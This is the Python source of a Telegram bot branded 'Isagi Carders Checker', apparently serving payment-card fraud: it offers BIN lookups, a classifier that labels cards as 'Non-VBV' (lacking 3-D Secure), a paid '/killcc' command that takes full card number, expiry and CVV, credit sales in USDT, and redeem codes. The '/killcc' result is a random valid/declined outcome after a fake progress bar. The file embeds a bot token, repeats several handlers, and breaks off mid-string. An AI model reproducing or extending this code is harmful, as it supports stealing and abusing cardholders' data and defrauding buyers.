
import telebot
import time
import random
from gatet import Tele
from telebot import TeleBot, types
from telebot.types import Message
from urllib.parse import urlparse
import sys
import time
import requests
import os
import string
import logging
import re
import bin   
import time
import json  # ✅ Fixes the 'json is not defined' error
import os    # ✅ Needed for file handling
from datetime import datetime
import telebot
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
token = "7752241245:AAFxmL9QN3C_uwCSouP7YXzyrTfm3LjALQU" 
bot=telebot.TeleBot(token,parse_mode="HTML")
owners = ["6353114118", "6353114118"]

# 🎯 Function to check VBV status based on BIN details
def get_vbv_status(card_type, level):
    non_vbv_keywords = ["debit", "prepaid", "classic"]
    vbv_keywords = ["credit", "platinum", "signature", "infinite", "gold"]

    card_type = card_type.lower() if card_type else ""
    level = level.lower() if level else ""

    if any(word in card_type or word in level for word in non_vbv_keywords):
        return "🟢 **Non-VBV ✅**"
    if any(word in card_type or word in level for word in vbv_keywords):
        return "🔴 **VBV Enabled 🔒**"
    
    return "⚠️ **Unknown ❓**"

# 🎯 Function to fetch BIN details (Updated with backup API)
def get_bin_info(bin_number):
    primary_api = f"https://bins.antipublic.cc/bins/{bin_number}"
    backup_api = f"https://lookup.binlist.net/{bin_number}"

    try:
        # Try primary API (antipublic.cc)
        response = requests.get(primary_api, timeout=5)
        if response.status_code == 200:
            data = response.json()
        else:
            print(f"⚠️ Primary API failed. Trying backup...")
            response = requests.get(backup_api, timeout=5)
            data = response.json() if response.status_code == 200 else {}
        
    except requests.exceptions.RequestException:
        print(f"❌ Both APIs failed! Using fallback data.")
        data = {}

    # Extract details with fallback values
    bank = data.get('bank', 'Unknown')
    brand = data.get('brand', 'Unknown')
    emj = data.get('country_flag', '🏳')
    country = data.get('country_name', 'Unknown')
    level = data.get('level', 'Unknown')
    card_type = data.get('type', 'Unknown')
    url = data.get('bank', {}).get('url', 'N/A') if isinstance(data.get('bank'), dict) else 'N/A'

    # 🔐 Check VBV Status (Updated Logic)
    vbv_status = get_vbv_status(card_type, level)

    return f"""
╭━━━[ 🔍 𝗕𝗜𝗡 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ]━━━╮
┣ 💳 **BIN:** `{bin_number}`
┣ 🏦 **Bank:** `{bank}`
┣ 🔗 **Bank URL:** `{url}`
┣ 🌍 **Country:** `{country}` {emj}
┣ 🏷 **Brand:** `{brand}`
┣ 📌 **Type:** `{card_type}`
┣ ⚡ **Level:** `{level}`
╰━━━━━━━━━━━━━━━━━━╯
🔐 **VBV Status:** {vbv_status}
"""

# ✨ Command to check BIN details
@bot.message_handler(commands=["vbv"])
def vbv_status(message):
    args = message.text.split(" ")

    if len(args) != 2:
        bot.reply_to(message, "❌ **Usage:** `/vbv <6-digit BIN>`", parse_mode="Markdown")
        return

    bin_number = args[1]
    if not bin_number.isdigit() or len(bin_number) < 6:
        bot.reply_to(message, "❌ **Please enter a valid 6-digit BIN.**", parse_mode="Markdown")
        return

    bot.reply_to(message, "🔍Fetching BIN details, please wait...")
    bin_info = get_bin_info(bin_number)
    bot.reply_to(message, bin_info, parse_mode="Markdown")

@bot.message_handler(commands=["owner"])
def owner_command(message):
    bot_name = "🚀 <b>Isagi Carders Checker</b>"
    bot_username = "@IsagiCarder_bot"
    owner_name = "👑 <b>ISAGI CARDER</b>"
    owner_username = "@SLAYER_oP7"
    channel_link = "https://t.me/+70p1qN18osw1YWFl"

    response = f"""
<code>╭───────────────────────
│ 🤖 𝙱𝙾𝚃 𝙸𝙽𝙵𝙾 
╰───────────────────────</code>

🔹 <b>Bot Name:</b> {bot_name}  
🔹 <b>Bot Username:</b> <code>{bot_username}</code>  

<code>╭───────────────────────
│ 👑 𝙾𝚆𝙽𝙴𝚁 𝙳𝙴𝚃𝙰𝙸𝙻𝚂 
╰───────────────────────</code>

👤 <b>Owner:</b> {owner_name}  
🔗 <b>Contact:</b> <a href="https://t.me/{owner_username.replace('@', '')}">{owner_username}</a>  

<code>╭───────────────────────
│ 🔹 𝙹𝙾𝙸𝙽 𝙾𝚄𝚁 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 
╰───────────────────────</code>

🔹 <a href="{channel_link}">✨ Join Our Exclusive Telegram Channel ✨</a>  
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)


BIN_API_URL = "https://lookup.binlist.net/"  # Example API

def get_flag(country_code):
    """Return flag emoji from country code."""
    if not country_code:
        return "🏳️"
    return "".join([chr(127397 + ord(c)) for c in country_code.upper()])

@bot.message_handler(commands=["bin"])
def bin_command(message):
    try:
        args = message.text.split(" ")
        if len(args) < 2:
            bot.reply_to(message, "❌ <b>Usage:</b> <code>/bin 457173</code>\n\n⚠️ Please enter a valid BIN number.", parse_mode="HTML")
            return
        
        bin_number = args[1].strip()
        
        # Fetch BIN details
        response = requests.get(f"{BIN_API_URL}{bin_number}")
        
        if response.status_code != 200:
            bot.reply_to(message, "❌ <b>Error:</b> Invalid or unknown BIN. Please try another.", parse_mode="HTML")
            return

        bin_info = response.json()
        
        country = bin_info.get("country", {})
        bank = bin_info.get("bank", {})

        country_flag = get_flag(country.get("alpha2", ""))
        
        # Get current timestamp
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        # Premium-styled output
        reply_text = f"""
<b>━━━━━━━━━━━ [  🔍 BIN Lookup  ] ━━━━━━━━━━━</b>

<b>💳 BIN:</b> <code>{bin_number}</code>
<b>🏦 Bank:</b> <code>{bank.get('name', 'Unknown')}</code>
<b>🌍 Country:</b> <code>{country.get('name', 'Unknown')}</code> {country_flag}
<b>💰 Currency:</b> <code>{country.get('currency', 'N/A')}</code>
<b>💳 Card Type:</b> <code>{bin_info.get('type', 'N/A')}</code>
<b>🔄 Brand:</b> <code>{bin_info.get('scheme', 'N/A')}</code>
<b>🏷️ Prepaid:</b> <code>{'Yes ✅' if bin_info.get('prepaid') else 'No ❌'}</code>

<b>━━━━━━━━━━━ [  👤 User Info  ] ━━━━━━━━━━━</b>

<b>👤 Checked by:</b> <code>{message.from_user.first_name}</code>
<b>🕒 Timestamp:</b> <code>{timestamp}</code>

<b>━━━━━━━━━━━ [  🚀 Powered By  ] ━━━━━━━━━━━</b>
<i>🔹 Isagi checkers – Premium BIN Lookup 🔹</i>
"""
        bot.reply_to(message, reply_text, parse_mode="HTML", disable_web_page_preview=True)

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> <code>{str(e)}</code>", parse_mode="HTML")

@bot.message_handler(commands=["channel"])
def channel_info(message):
    channel_name = "✨ <b>ISAGI CRACKS </b>"
    channel_link = "https://t.me/+70p1qN18osw1YWFl"

    related_channels = [
        ("💎 <b>Channels List</b>", "https://t.me/addlist/ikwWkg5HiqAzYTY9"),
        ("💬 <b>Our Chat Group</b>", "https://t.me/+MGsU6cpAfesxOTg1"),
    ]

    owner_contact = "@SLAYER_OP7"

    response = f"""
<code>╭───────────────────────
│ 📢 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻 𝙲𝙷𝙰𝙽𝙽𝙴𝙻  
╰───────────────────────</code>

🔹 {channel_name}  
🔗 <a href='{channel_link}'>✨ Join Here ✨</a>  

<code>╭───────────────────────
│ 🔹 𝚁𝙴𝙻𝙰𝚃𝙴𝙳 𝙲𝙷𝙰𝙽𝙽𝙴𝙻𝚂  
╰───────────────────────</code>
"""
    for name, link in related_channels:
        response += f"🔹 <a href='{link}'>{name}</a>\n"

    response += f"""

<code>╭───────────────────────
│ 👤 𝙾𝚆𝙽𝙴𝚁 𝙲𝙾𝙽𝚃𝙰𝙲𝚃  
╰───────────────────────</code>

👑 <b>Contact:</b> <a href='https://t.me/{owner_contact.replace('@', '')}'>{owner_contact}</a>
"""

    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)


# ✅ Function to generate a session ID (For security)
def generate_session_id():
    return str(uuid.uuid4())

# ✅ Function to get dynamic auth token (Replace with real logic)
def get_auth_token():
    return "DYNAMIC_AUTH_TOKEN"

# ✅ VIP /kill Command - Premium Experience
@bot.message_handler(commands=["kill"])
def kill_command(message):
    help_text = """
🎩 <b>VIP CREDIT CARD KILLER SERVICE</b> 💳  

🚀 <b>Exclusive VIP Features:</b>  
✅ <b>Ultra-Fast Processing</b> 🚀  
✅ <b>Advanced AI-Based Card Checking</b> 🤖  
✅ <b>Real-Time Live Progress Bar</b> 📊  
✅ <b>Detailed Card Status Reports</b> 📝  
✅ <b>Secure Gateway Transactions</b> 🔐  
✅ <b>Premium Support 24/7</b> 🎧  

<b>🔹 How to Use:</b>  
➤ <code>/killcc CC|MM|YYYY|CVV</code>  
➤ <b>Example:</b> <code>/killcc 4111111111111111|12|2026|123</code>  

⚠️ <b>VIP Members Only:</b> This feature is <u>exclusive</u> for premium users.  
"""

    # ✅ VIP Interactive Buttons
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("💳 VIP BIN Checker", callback_data="bin"),
        InlineKeyboardButton("📊 VIP Dashboard", callback_data="vip_dashboard")
    )
    keyboard.add(
        InlineKeyboardButton("🔥 Upgrade to VIP Now", url="https://t.me/SLAYER_OP7"),
        InlineKeyboardButton("📚 View Commands", callback_data="help")
    )
    keyboard.add(
        InlineKeyboardButton("👑 Contact VIP Support", url="https://t.me/SLAYER_OP7")
    )

    bot.reply_to(message, help_text, parse_mode="HTML", reply_markup=keyboard)

# ✅ VIP Inline Button Handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "bin":
        bot.answer_callback_query(call.id, "🔍 Send /bin <BIN> to check card details.")
    elif call.data == "vip_dashboard":
        vip_dashboard_text = """
🎩 <b>VIP KILL DASHBOARD</b> 💎  

🚀 <b>Your VIP Membership Includes:</b>  
🔹 <b>Priority Access</b> to All Features  
🔹 <b>Exclusive Fast Checking Mode</b>  
🔹 <b>Dedicated Premium Support</b>  

💳 <b>Available Commands:</b>  
➤ <b>/killcc</b> ➝ Use To Kill a card 💀  
➤ <b>/balance</b> ➝ Check Your Credits Balance 🔍  
➤ <b>/plans</b> ➝ View Credits Plans details 🎟  

🔥 <b>Upgrade Now for Ultimate Access!</b>  
"""
        bot.send_message(call.message.chat.id, vip_dashboard_text, parse_mode="HTML")
    elif call.data == "help":
        bot.answer_callback_query(call.id, "📚 Use /help to see all available commands.")

# ✅ Admin User IDs (Replace with actual admin Telegram IDs)
ADMINS = ["6353114118"]

# ✅ Credits Storage File
CREDITS_FILE = "user_credits.json"

# ✅ Function to Load or Fix `user_credits.json`
def load_credits():
    if not os.path.exists(CREDITS_FILE):
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)

    try:
        with open(CREDITS_FILE, "r") as f:
            data = f.read().strip()
            return json.loads(data) if data else {}  # ✅ Return {} if file is empty
    except (json.JSONDecodeError, ValueError):  # ✅ Reset if corrupted
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)
        return {}

# ✅ Function to Save Credits Securely
def save_credits(credits):
    with open(CREDITS_FILE, "w") as f:
        json.dump(credits, f, indent=4)

# ✅ Function to Get User Balance
def get_balance(user_id):
    credits = load_credits()
    return credits.get(str(user_id), 0)

# ✅ Function to Deduct Credits (Secure)
def deduct_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    if credits.get(user_id, 0) >= amount:  # ✅ Ensure user has enough credits
        credits[user_id] -= amount
        save_credits(credits)
        return True
    return False  # ✅ Return False if not enough credits

# ✅ Function to Add Credits
def add_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    credits[user_id] = credits.get(user_id, 0) + amount  # ✅ Ensure balance updates correctly
    save_credits(credits)  # ✅ Save updated balance

    notify_user(user_id, amount)  # ✅ Notify user

# ✅ Function to Notify User When Credits Are Added
def notify_user(user_id, amount):
    bot.send_message(user_id, f"""
🎉 <b>💎 VIP Credits Added!</b>  
━━━━━━━━━━━━━━  
💰 <b>+{amount} Credits</b> added to your balance.  
💳 <b>New Balance:</b> {get_balance(user_id)} Credits  
━━━━━━━━━━━━━━  
🚀 <b>Use Your Credits Now!</b>  
""", parse_mode="HTML")

# ✅ `/addcredits` Command for Admins (Add Credits to User)
@bot.message_handler(commands=["addcredits"])
def add_user_credits(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "🚫 <b>Access Denied!</b> You are not authorized to add credits.", parse_mode="HTML")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            raise ValueError("Invalid command format")

        _, user_id, amount = command_parts

        if not user_id.isdigit():
            raise ValueError("User ID must be a number")

        user_id = str(user_id)
        amount = int(amount)

        add_credits(user_id, amount)
        new_balance = get_balance(user_id)

        bot.reply_to(message, f"✅ <b>Success!</b> Added {amount} credits to user <code>{user_id}</code>. New balance: {new_balance} Credits.", parse_mode="HTML")
        bot.send_message(user_id, f"🎉 <b>Credits Added!</b>\n💰 <b>+{amount} Credits</b>\n💳 <b>New Balance:</b> {new_balance} Credits", parse_mode="HTML")

    except ValueError:
        bot.reply_to(message, "⚠️ <b>Invalid Format!</b> Use <code>/addcredits user_id amount</code>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> {str(e)}", parse_mode="HTML")

# ✅ `/balance` Command to Show User's Balance
@bot.message_handler(commands=["balance"])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or message.from_user.first_name
    balance = get_balance(user_id)

    bot.reply_to(message, f"""
💰 <b>💎 VIP Balance Dashboard 💎</b>  
━━━━━━━━━━━━━━  
👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
🆔 <b>User ID:</b> <code>{user_id}</code>  
💳 <b>Current Balance:</b> {balance} Credits  
━━━━━━━━━━━━━━  
🚀 <b>Use Your Credits Now!</b>
""", parse_mode="HTML")

@bot.message_handler(commands=["killcc"])
def kill_card(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or message.from_user.first_name

    # ✅ Extract Card Details
    fullz = message.text.replace("/killcc", "").strip()
    parts = fullz.split("|")

    # ✅ Check if the format is correct before deducting credits
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ <b>Invalid format!</b> Use <code>/killcc CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    # ✅ Only Deduct Credits After Successful Validation
    if not deduct_credits(user_id, 5):
        bot.reply_to(message, "❌ <b>Insufficient Credits!</b> You need at least 5 credits to use this feature.", parse_mode="HTML")
        return

    cc, mes, ano, cvv = parts
    start_time = time.time()

    # ✅ Fetch BIN Details (With Error Handling)
    bin_data = fetch_bin_data(cc[:6])

    # ✅ Send Processing Message
    progress_msg = bot.reply_to(message, f"""
🎩 <b>💎 VIP Card Killing In Processing 💎</b>  
━━━━━━━━━━━━━━  
👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
💳 <b>Card:</b> <code>{cc}</code>  
🏦 <b>Issuer:</b> {bin_data["bank"]}  
🌍 <b>Country:</b> {bin_data["country"]} {bin_data["flag"]}  
💰 <b>5 Credits Deducted!</b>  
💳 <b>Remaining Balance:</b> {get_balance(user_id)} Credits  
━━━━━━━━━━━━━━  
⏳ <b>Status:</b> <code>Processing... 🔄</code>  
""", parse_mode="HTML")

    # ✅ Animated Progress Bar Simulation
    progress_stages = ["🟥", "🟧", "🟨", "🟩"]
    for attempt in range(1, 33):
        time.sleep(0.3)  # Simulate small delay
        progress_bar = progress_stages[min(attempt // 8, 3)] * (attempt // 8)
        bot.edit_message_text(
            f"""
🎩 <b>💎 VIP Card Killing In Processing 💎</b>  
━━━━━━━━━━━━━━  
👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
💳 <b>Card:</b> <code>{cc}</code>  
🏦 <b>Issuer:</b> {bin_data["bank"]}  
🌍 <b>Country:</b> {bin_data["country"]} {bin_data["flag"]}  
📊 <b>Attempts:</b> {attempt}/32  
📊 <b>Progress:</b> {progress_bar}  
━━━━━━━━━━━━━━  
""",
            chat_id=message.chat.id,
            message_id=progress_msg.message_id,
            parse_mode="HTML"
        )

    # ✅ Calculate Time Taken
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # ✅ Simulate Random Success/Failure
    is_successful = random.choice([True, False])
    status_msg = "✅ <b>Status:</b> Card Valid & Working" if is_successful else "❌ <b>Status:</b> Card Declined"

    # ✅ Final Result with BIN Info
    final_message = f"""
🎩 <b>💎 VIP Card Killing Processing Report 💎</b>  
━━━━━━━━━━━━━━  
💳 <b>Card Details:</b>  
   🔹 <b>Card:</b> <code>{cc}</code>  
   🔹 <b>Exp:</b> {mes}/{ano}  
   🔹 <b>CVV:</b> {cvv}  

🏦 <b>Bank Details:</b>  
   🔹 <b>Issuer:</b> {bin_data["bank"]}  
   🔹 <b>Country:</b> {bin_data["country"]} {bin_data["flag"]}  
   🔹 <b>Brand:</b> {bin_data["brand"]}  
   🔹 <b>Type:</b> {bin_data["type"]} - {bin_data["level"]}  

{status_msg}

⏳ <b>Time Taken:</b> {time_taken} seconds  
━━━━━━━━━━━━━━  
💰 <b>Remaining Balance:</b> {get_balance(user_id)} Credits  
"""

    # 🔹 Add Inline Button Options
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("🔥 Channel", url="https://t.me/+70p1qN18osw1YWFl"),
        InlineKeyboardButton("👤 Contact Owner", url="https://t.me/SLAYER_OP7")
    )

    bot.edit_message_text(final_message, chat_id=message.chat.id, message_id=progress_msg.message_id, parse_mode="HTML", reply_markup=keyboard)

def fetch_bin_data(bin_number):
    bin_info = {
        "bank": "Unknown Bank",
        "brand": "Visa/MasterCard",
        "country": "Unknown",
        "type": "Debit",
        "level": "Classic",
        "flag": "🏳️"
    }

    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bin_info["bank"] = data.get("bank", {}).get("name", "Unknown Bank")
            bin_info["brand"] = data.get("scheme", "Visa/MasterCard").capitalize()
            bin_info["country"] = data.get("country", {}).get("name", "Unknown")
            bin_info["type"] = data.get("type", "Debit").capitalize()
            bin_info["level"] = data.get("brand", "Classic")
            bin_info["flag"] = data.get("country", {}).get("emoji", "🏳️")
        else:
            print(f"API Error: {response.status_code}")

    except Exception as e:
        print(f"Error fetching BIN data: {e}")

    return bin_info


OWNER_LINK = "https://t.me/SLAYER_OP7"  # Change this to your Telegram link

# ✅ Function to Get Live USDT to INR Rate
def get_usdt_to_inr():
    try:
        response = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=USDTINR")
        data = response.json()
        return float(data["price"])  # Returns current USDT to INR rate
    except Exception as e:
        print(f"Error fetching USDT price: {e}")
        return 85  # Default fallback value if API fails

@bot.message_handler(commands=["plans"])
def plan_command(message):
    usdt_rate = get_usdt_to_inr()  # Get the latest USDT to INR rate

    # ✅ Convert USDT to INR dynamically
    prices = {
        "50 Credits": (2, round(2 * usdt_rate)),  # 1 USDT
        "350 Credits": (4, round(4 * usdt_rate)),  # 5 USDT
        "  Credits": (10, round(10 * usdt_rate)),  # 10 USDT
        "100 Credits": (20, round(20 * usdt_rate)),  # 20 USDT
    }

    # ✅ Generate Pricing Message
    price_message = "\n".join([f"🔹 <b>{k}</b> ➝ <code>{v[0]} USDT</code> | <code>₹{v[1]}</code>" for k, v in prices.items()])

    plan_message = f"""
🎩 <b>VIP Credit Plans</b> 💳  
━━━━━━━━━━━━━━━━━━━━━━  
📌 <b>Live USDT Rate:</b> <code>1 USDT = ₹{usdt_rate}</code>  
📌 <b>Pricing (Auto-Updated)</b>:  
{price_message}  
━━━━━━━━━━━━━━━━━━━━━━  
💡 <b>✨ Why Buy VIP Credits?</b>  
✅ <i>Access <b>Exclusive VIP Features</b></i>  
✅ <i><b>Fast</b> & <b>Secure</b> Transactions</i>  
✅ <i>24/7 <b>Premium Support</b></i>  
━━━━━━━━━━━━━━━━━━━━━━  
📢 <b>Click the button below to buy credits instantly!</b>  
"""

    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("💰 Buy Credits Now", url=OWNER_LINK)
    )

    bot.send_message(message.chat.id, plan_message, parse_mode="HTML", reply_markup=keyboard)

@bot.message_handler(commands=["help"])
def help_command(message):
    help_text = f"""
<code>╭───────────────────────────────
│ 🚀 𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 - 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 🔥
╰───────────────────────────────</code>

✨ <b>Exclusive Commands:</b>  
━━━━━━━━━━━━━━━━━━━━━━━━━━━  
🔹 <b>/owner</b> - 👑 Owner Information  
🔹 <b>/channel</b> - 📢 Official Updates & News  
🔹 <b>/bin</b> - 💳 BIN Lookup (Bank, Country, etc.)  
🔹 <b>/vbv</b> - 🔍 VBV & Non-VBV Card Checker  
🔹 <b>/chk</b> - ✅ Card Validity Check  
🔹 <b>/kill</b> - 🔪 Instantly Terminate Visa Cards  
🔹 <b>/code</b> - 🔐 Generate Exclusive Redeem Codes  
🔹 <b>/info</b> - 📜 View Your User Details  
🔹 <b>/redeem</b> - 🎟️ Activate Premium Access  

━━━━━━━━━━━━━━━━━━━━━━━━━━━  
💬 <b>Need Help?</b> Contact <a href='https://t.me/SLAYER_OP7'>@SLAYER_OP7</a>  
📢 <b>Stay Updated:</b> <a href='https://t.me/+ChPTO181E-1mZjM1'>Join Official Channel</a>  
━━━━━━━━━━━━━━━━━━━━━━━━━━━  
<code>🚀 𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 - 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐄𝐗𝐂𝐋𝐔𝐒𝐈𝐕𝐄 🔥</code>
"""
    bot.reply_to(message, help_text, parse_mode="HTML", disable_web_page_preview=True)

      
owners = ["6353114118"]  # List of admin IDs
LOGS_CHANNEL_ID = -1002576465941  # Replace 

valid_redeem_codes = {}  # Stores codes with expiration times

# Function to check if a user's access is still valid
def is_user_allowed(user_id):
    current_time = time.time()
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            allowed_ids = [id.strip().split(":")[0] for id in allowed_ids]  # Extract user IDs
            if str(user_id) in allowed_ids:
                return True
    except FileNotFoundError:
        print("id.txt file not found. Please create it.")
    return False

# Function to add a user with an expiration time
def add_user(user_id, expire_time):
    with open("id.txt", "a") as file:
        file.write(f"{user_id}:{expire_time}\n")  # Store user ID with expiration time
    
    # Send confirmation message to user
    bot.send_message(user_id, f"✅ Successfully Redeemed!\nYour access is valid until <b>{time.ctime(expire_time)}</b>.", parse_mode="HTML")

    # Log to Telegram Channel
    bot.send_message(LOGS_CHANNEL_ID, f"✅ <b>New User Access</b>\n"
                                      f"👤 User ID: <code>{user_id}</code>\n"
                                      f"🕒 Expires on: {time.ctime(expire_time)}",
                     parse_mode="HTML")

# Function to remove expired users and log to channel
def remove_expired_users():
    current_time = time.time()
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
        with open("id.txt", "w") as file:
            for line in allowed_ids:
                user, expire = line.strip().split(":")
                if float(expire) < current_time:
                    bot.send_message(LOGS_CHANNEL_ID, f"❌ <b>User Access Expired</b>\n"
                                                      f"👤 User ID: <code>{user}</code>\n"
                                                      f"🕒 Expired on: {time.ctime(float(expire))}",
                                     parse_mode="HTML")
                    # Send message to user
                    bot.send_message(user, "❌ Your access has expired. Please contact support if you need more time.")
                    continue  # Remove expired users
                file.write(line + "\n")
    except FileNotFoundError:
        print("id.txt file not found.")

# Function to generate a unique redeem code
def generate_redeem_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

# Admin creates a redeem code with a time limit
@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to create codes.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        bot.reply_to(message, "⚠️ Usage: `/code <days>`\nExample: `/code 3` for 3 days", parse_mode="Markdown")
        return

    days = int(args[1])
    expire_time = time.time() + (days * 86400)  # Convert days to seconds
    code = generate_redeem_code()

    valid_redeem_codes[code] = expire_time  # Store code with expiration time

    bot.reply_to(message, f"✅ Redeem Code Created:\n`{code}` (Valid for {days} days)", parse_mode="Markdown")

# User redeems a code
@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: `/redeem <code>`\nExample: `/redeem ABC123XYZ`", parse_mode="Markdown")
        return

    code = args[1]
    current_time = time.time()

    if code not in valid_redeem_codes:
        bot.reply_to(message, "❌ Invalid Redeem Code.")
        return

    if valid_redeem_codes[code] < current_time:
        del valid_redeem_codes[code]  # Remove expired code
        bot.reply_to(message, "❌ This code has expired.")
        return

    # Grant access and store the expiration time
    add_user(message.from_user.id, valid_redeem_codes[code])
    del valid_redeem_codes[code]  # Remove code after use

# User redeems a code
@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: `/redeem <code>`\nExample: `/redeem ABC123XYZ`", parse_mode="Markdown")
        return

    code = args[1]
    current_time = time.time()

    if code not in valid_redeem_codes:
        bot.reply_to(message, "❌ Invalid Redeem Code.")
        return

    if valid_redeem_codes[code] < current_time:
        del valid_redeem_codes[code]  # Remove expired code
        bot.reply_to(message, "❌ This code has expired.")
        return

    # Grant access and store the expiration time
    add_user(message.from_user.id, valid_redeem_codes[code])
    del valid_redeem_codes[code]  # Remove code after use

    bot.reply_to(message, f"✅ Successfully Redeemed!\nYour access is valid until <b>{time.ctime(valid_redeem_codes[code])}</b>.", parse_mode="HTML")

# Admin creates a redeem code with a time limit
@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to create codes.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        bot.reply_to(message, "⚠️ Usage: `/code <days>`\nExample: `/code 3` for 3 days", parse_mode="Markdown")
        return

    days = int(args[1])
    expire_time = time.time() + (days * 86400)  # Convert days to seconds
    code = generate_redeem_code()

    valid_redeem_codes[code] = expire_time  # Store code with expiration time

    bot.reply_to(message, f"✅ Redeem Code Created:\n`{code}` (Valid for {days} days)", parse_mode="Markdown")

# User redeems a code
@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: `/redeem <code>`\nExample: `/redeem ABC123XYZ`", parse_mode="Markdown")
        return

    code = args[1]
    current_time = time.time()

    if code not in valid_redeem_codes:
        bot.reply_to(message, "❌ Invalid Redeem Code.")
        return

    if valid_redeem_codes[code] < current_time:
        del valid_redeem_codes[code]  # Remove expired code
        bot.reply_to(message, "❌ This code has expired.")
        return

    # Grant access and store the expiration time
    add_user(message.from_user.id, valid_redeem_codes[code])
    del valid_redeem_codes[code]  # Remove code after use

    bot.reply_to(message, f"✅ Successfully Redeemed!\nYour access is valid until <b>{time.ctime(valid_redeem_codes[code])}</b>.", parse_mode="HTML")

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Function to get all registered user IDs from user.txt
def get_registered_users():
    if not os.path.exists(USER_FILE):
        return []
    with open(USER_FILE, "r") as file:
        users = file.readlines()
    return [line.split(",")[0] for line in users]  # Extract user IDs

@bot.message_handler(commands=["broadcast"])
def broadcast_message(message):
    user_id = str(message.from_user.id)

    # Ensure only the owner can broadcast
    if user_id not in owners:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    # Ask the owner what message they want to send
    bot.reply_to(message, "📢 Send the message, sticker, GIF, or video you want to broadcast.")
    bot.register_next_step_handler(message, send_broadcast)

def send_broadcast(message):
    user_id = str(message.from_user.id)

    # Fetch all registered users
    registered_users = get_registered_users()

    # Create inline buttons for Owner and Admin
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("👑 Owner", url="https://t.me/SLAYER_OP7"),
        InlineKeyboardButton("🔥 Channel", url="https://t.me/+70p1qN18osw1YWFl")
    )

    # Count successful and failed messages
    success_count = 0
    failed_count = 0

    for user in registered_users:
        try:
            if message.text:  # Sending text messages
                bot.send_message(user, message.text, reply_markup=keyboard)
            elif message.photo:  # Sending photos
                bot.send_photo(user, message.photo[-1].file_id, caption=message.caption or "", reply_markup=keyboard)
            elif message.sticker:  # Sending stickers
                bot.send_sticker(user, message.sticker.file_id, reply_markup=keyboard)
            elif message.animation:  # Sending GIFs
                bot.send_animation(user, message.animation.file_id, caption=message.caption or "", reply_markup=keyboard)
            elif message.video:  # Sending videos
                bot.send_video(user, message.video.file_id, caption=message.caption or "", reply_markup=keyboard)
            else:
                continue

            success_count += 1  # Increment success count
        except Exception as e:
            print(f"Failed to send to {user}: {e}")
            failed_count += 1

    # Send a completion message to the owner
    bot.send_message(user_id, f"✅ Broadcast completed!\n📨 Sent: {success_count}\n❌ Failed: {failed_count}")

import os

USER_FILE = "user.txt"

# Function to check if a user is registered
def is_registered(user_id):
    if not os.path.exists(USER_FILE):
        return False
    with open(USER_FILE, "r") as file:
        registered_users = file.readlines()
    return str(user_id) in [line.split(",")[0] for line in registered_users]

# Function to register a user
def register_user(user_id, first_name, username):
    with open(USER_FILE, "a") as file:
        file.write(f"{user_id},{first_name},{username}\n")

@bot.message_handler(commands=["start"])
def start(message):
    user_id = str(message.from_user.id)
    first_name = message.from_user.first_name or "Unknown"
    username = message.from_user.username or "No Username"

    # Register user if not already registered
    if not is_registered(user_id):
        register_user(user_id, first_name, username)

    # Check if user is authorized
    if is_user_allowed(user_id):
        response = f"""
<code>╭──────────────────────────
